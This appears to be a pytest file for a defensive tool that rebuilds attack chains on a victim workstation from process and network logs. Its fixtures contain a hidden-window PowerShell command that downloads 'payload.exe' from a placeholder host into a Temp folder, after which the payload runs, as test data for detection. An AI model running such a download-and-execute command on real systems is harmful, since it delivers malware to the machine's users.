"""Tests for victim-side attack-chain reconstruction."""

import sys
from datetime import UTC, datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from defense_agent.parsers.base import CanonicalEvent  # noqa: E402
from defense_agent.scripts.reconstruct_victim_chain import (  # noqa: E402
    extract_download_target,
    make_process_steps,
    process_index,
    victim_scope,
)


def event(
    *,
    seconds: int,
    host: str = "WS-01",
    source: str = "ecar",
    event_type: str = "process_create",
    pid: int | None = None,
    ppid: int | None = None,
    process_name: str | None = None,
    command_line: str | None = None,
    src_ip: str | None = None,
) -> CanonicalEvent:
    """Build a minimal canonical event for tests."""
    return CanonicalEvent(
        timestamp=datetime(2025, 1, 1, tzinfo=UTC) + timedelta(seconds=seconds),
        host=host,
        source=source,
        event_type=event_type,
        pid=pid,
        ppid=ppid,
        process_name=process_name,
        command_line=command_line,
        src_ip=src_ip,
    )


def test_extract_download_target() -> None:
    """PowerShell DownloadFile destinations are recovered for artifact lineage."""
    command = (
        'powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('
        "'http://cdn.test/payload.exe','C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe')\""
    )

    assert extract_download_target(command) == (
        "C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe"
    )


def test_victim_scope_excludes_other_endpoint_but_keeps_victim_network() -> None:
    """Attacker endpoint noise is excluded while victim-origin sensor traffic remains."""
    events = [
        event(seconds=0, host="WS-01.example.local", pid=1),
        event(seconds=1, host="ATK-01", pid=2),
        event(
            seconds=2,
            host="10.0.1.10",
            source="zeek_http",
            event_type="http_request",
            src_ip="10.0.1.10",
        ),
    ]

    scoped = victim_scope(events, "WS-01", "10.0.1.10")

    assert len(scoped) == 2
    assert all(item.host != "ATK-01" for item in scoped)


def test_temp_installer_requires_attack_lineage() -> None:
    """Ordinary installers in Temp do not become incident steps without lineage."""
    powershell = event(
        seconds=0,
        pid=100,
        process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line=(
            'powershell.exe -WindowStyle Hidden -Command "'
            "(New-Object Net.WebClient).DownloadFile('http://cdn.test/payload.exe',"
            "'C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe')\""
        ),
    )
    payload = event(
        seconds=20,
        pid=101,
        ppid=100,
        process_name=r"C:\Users\alice\AppData\Local\Temp\payload.exe",
        command_line=r"C:\Users\alice\AppData\Local\Temp\payload.exe",
    )
    installer = event(
        seconds=40,
        pid=102,
        ppid=999,
        process_name=r"C:\Users\alice\AppData\Local\Temp\ChromeSetup.exe",
        command_line="ChromeSetup.exe --silent",
    )
    events = [powershell, payload, installer]
    processes, corroboration, suspicious = process_index(events, "WS-01")

    steps = make_process_steps(events, processes, corroboration, suspicious)

    ids = {step.candidate_id for step in steps}
    assert "proc-101" in ids
    assert "proc-102" not in ids
